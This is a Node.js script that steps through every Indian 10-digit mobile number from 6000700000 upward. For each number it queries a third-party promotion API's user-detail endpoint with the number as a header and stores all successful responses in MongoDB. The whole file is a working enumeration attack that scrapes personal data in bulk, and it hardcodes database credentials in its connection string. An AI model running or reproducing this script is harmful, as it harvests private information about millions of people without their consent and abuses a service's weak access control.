const axios = require('axios');
const mongoose = require('mongoose');

// Define the range of 10-digit Indian phone numbers
const startNumber = 6000700000;
const endNumber = 9999999999;



// MongoDB connection URL
const mongoDBUrl = 'mongodb+srv://surajpandey0094:0094@cluster0.7y7t9uy.mongodb.net/test?tls=true';

// Define a MongoDB schema and model for success and error data
const Schema = mongoose.Schema;

const successSchema = new Schema({
  msisdn: String,
  data: Object,
},{ timestamps: true });

const errorSchema = new Schema({
  msisdn: String,
  data: Object,
},{ timestamps: true });

const SuccessModel = mongoose.model('Success', successSchema);
const ErrorModel = mongoose.model('Error', errorSchema);

// Connect to the MongoDB database
mongoose.connect(mongoDBUrl, { useNewUrlParser: true, useUnifiedTopology: true });


// Function to make API requests
async function fetchUserDetail(msisdn) {
  try {
    const response = await axios.get('https://web.myfidelity.in/api/v1/cadbury-perk/fetch-user-detail', {
      headers: {
        'msisdn': msisdn,
      },
    });

    if (response?.data?.msg === 'GET_USER_DETAIL_SUCCESS' && response?.data?.code === 2000) {
      // Save successful response data to the MongoDB database
      const successData = new SuccessModel({ msisdn, data: response?.data?.data });
      await successData.save();
    } else {
      
      // Check if the error count has reached 1000 errors, then insert them into the database
      if (msisdn % 1000 == 0) {
        await insertErrorsIntoDatabase(msisdn);
      }
    }
  } catch (error) {
    
console.log(error)
    // Check if the error count has reached 1000 errors, then insert them into the database
    if (msisdn%1000) {
      await insertErrorsIntoDatabase(msisdn);
    }
  }
}

// Function to insert errors from the error queue into the MongoDB database
async function insertErrorsIntoDatabase(msisdn) {
  try {
    const errorsData = new ErrorModel({ msisdn, data: `${msisdn}` });
    await errorsData.save();

  } catch (error) {
    console.error('Error inserting errors into the database:', error);
  }
}

// Main function
async function main() {
  try {
  for (let number = startNumber; number <= endNumber; number++) {
    const msisdn = String(number).padStart(10, '0'); // Format as 10-digit string
    await fetchUserDetail(msisdn);
    // console.log(`Processed ${msisdn}`);
  }

  await insertErrorsIntoDatabase(endNumber);
  
  console.log('API requests completed.');
  mongoose.disconnect(); // Close the MongoDB connection when done
 } catch(err) {
  console.log(err)
 }
}

// Call the main function
main();
